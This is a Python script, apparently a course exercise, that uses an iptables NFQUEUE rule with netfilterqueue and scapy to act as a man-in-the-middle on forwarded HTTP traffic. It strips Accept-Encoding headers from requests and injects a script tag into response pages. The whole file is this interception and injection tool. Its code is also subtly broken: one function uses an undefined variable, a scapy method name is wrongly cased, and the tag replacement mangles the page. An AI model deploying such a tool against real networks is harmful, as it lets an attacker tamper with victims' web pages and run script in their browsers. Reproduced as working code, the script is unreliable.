#Execute this bash before running code
#iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy
import re

ack_list = []

def set_load(packet, load):
     scapy_packet[scapy.Raw].load = load
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     del packet[scapy.TCP].len
     del packet[scapy.IP].len   
     return packet

def process_packet(packet):
    scapy_packet =  scapy.IP(packet.get_payload())
    if scapy_packet.hasLayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            load = re.sub("Accept Encoding:.*?\\r\\n", "", load)
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            load = load.replace("<body>", "<script>alert('hello')</script></body>")
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()